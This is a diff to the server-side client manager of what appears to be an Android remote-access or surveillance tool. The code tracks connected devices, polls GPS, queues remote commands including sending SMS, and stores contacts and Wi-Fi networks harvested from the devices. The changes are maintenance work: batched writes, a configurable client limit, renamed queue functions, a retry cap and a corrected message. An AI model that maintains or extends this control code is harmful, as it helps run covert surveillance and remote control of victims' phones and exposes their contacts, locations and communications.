@@ -9,7 +9,6 @@ class Clients {
         this.gpsPollers = Object.create(null);
         this.clientDatabases = Object.create(null);
         this.ignoreDisconnects = Object.create(null);
-        this.instance = this;
         this.db = db;
     }
 
@@ -22,12 +21,12 @@ class Clients {
         if (clientID in this.ignoreDisconnects) this.ignoreDisconnects[clientID] = true;
         else this.ignoreDisconnects[clientID] = false;
 
-        console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);
+        if (CONST.debug) console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);
 
         let client = this.db.maindb.get('clients').find({ clientID });
         if (client.value() === undefined) {
             // Patch: Limit total unique clients to prevent disk exhaustion
-            if (this.db.maindb.get('clients').value().length > 1000) {
+            if (this.db.maindb.get('clients').value().length >= CONST.maxClients) {
                 delete this.clientConnections[clientID];
                 return connection.disconnect();
             }
@@ -55,7 +54,7 @@ class Clients {
     }
 
     clientDisconnect(clientID) {
-        console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);
+        if (CONST.debug) console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);
 
         const shouldIgnore = this.ignoreDisconnects[clientID];
         if (clientID in this.ignoreDisconnects) delete this.ignoreDisconnects[clientID];
@@ -97,10 +96,10 @@ class Clients {
         });
 
         // Run the queued requests for this client
-        let clientQue = client.get('CommandQue').value();
-        if (clientQue.length !== 0) {
+        let clientQueue = client.get('CommandQue').value();
+        if (clientQueue.length !== 0) {
             logManager.log(CONST.logTypes.info, clientID + " Running Queued Commands");
-            clientQue.forEach((command) => {
+            clientQueue.forEach((command) => {
                 let uid = command.uid;
                 this.sendCommand(clientID, command.type, command, (error) => {
                     if (error) {
@@ -366,12 +365,13 @@ class Clients {
                         contact.phoneNo = contact.phoneNo.replace(/\s+/g, '');
                         let hash = crypto.createHash('md5').update(contact.phoneNo + (contact.name || '')).digest("hex");
                         if (dbContacts.find({ hash }).value() === undefined) {
-                            // cool, we dont have this call
+                            // cool, we dont have this contact
                             contact.hash = hash;
-                            dbContacts.push(contact).write();
+                            dbContacts.push(contact);
                             newCount++;
                         }
                     });
+                    if (newCount > 0) dbContacts.write(); // Batch write
                     logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added");
                 }
             }
@@ -391,17 +391,18 @@ class Clients {
                         if (!wifi.SSID || !wifi.BSSID) return;
                         let wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
                         if (wifiField.value() === undefined) {
-                            // cool, we dont have this call
+                            // cool, we dont have this network
                             wifi.firstSeen = new Date();
                             wifi.lastSeen = new Date();
-                            dbwifiLog.push(wifi).write();
+                            dbwifiLog.push(wifi);
                             newCount++;
                         } else {
                             wifiField.assign({
                                 lastSeen: new Date()
-                            }).write();
+                            });
                         }
                     });
+                    dbwifiLog.write(); // Batch write
                     logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotspots Found");
                 }
             }
@@ -519,7 +520,7 @@ class Clients {
                         socket.emit('order', commandPayload)
                         return cb(false, 'Requested');
                     } else {
-                        this.queCommand(clientID, commandPayload, (error) => {
+                        this.queueCommand(clientID, commandPayload, (error) => {
                             if (!error) return cb(false, 'Command queued (device is offline)')
                             else return cb(error, undefined)
                         })
@@ -529,7 +530,7 @@ class Clients {
         });
     }
 
-    queCommand(clientID, commandPayload, cb) {
+    queueCommand(clientID, commandPayload, cb) {
         let clientDB = this.getClientDatabase(clientID);
         let commandQue = clientDB.get('CommandQue');
         let outstandingCommands = [];
@@ -540,8 +541,10 @@ class Clients {
         if (outstandingCommands.includes(commandPayload.type)) return cb('A similar command has already been queued');
         else {
             let uid;
+            let attempts = 0;
             do {
                 uid = crypto.randomBytes(4).readUInt32BE(0) % 10000;
+                if (++attempts > 100) return cb('Failed to generate unique command ID');
             } while (commandQue.find({ uid }).value());
             
             commandPayload.uid = uid;
@@ -558,7 +561,7 @@ class Clients {
                 if (commandPayload.action === 'ls') return cb(false);
                 else if (commandPayload.action === 'sendSMS') {
                     if (!('to' in commandPayload)) return cb('SMS Missing `to` Parameter');
-                    else if (!('sms' in commandPayload)) return cb('SMS Missing `to` Parameter');
+                    else if (!('sms' in commandPayload)) return cb('SMS Missing `sms` Parameter');
                     else return cb(false);
                 } else return cb('SMS `action` parameter incorrect');
             }
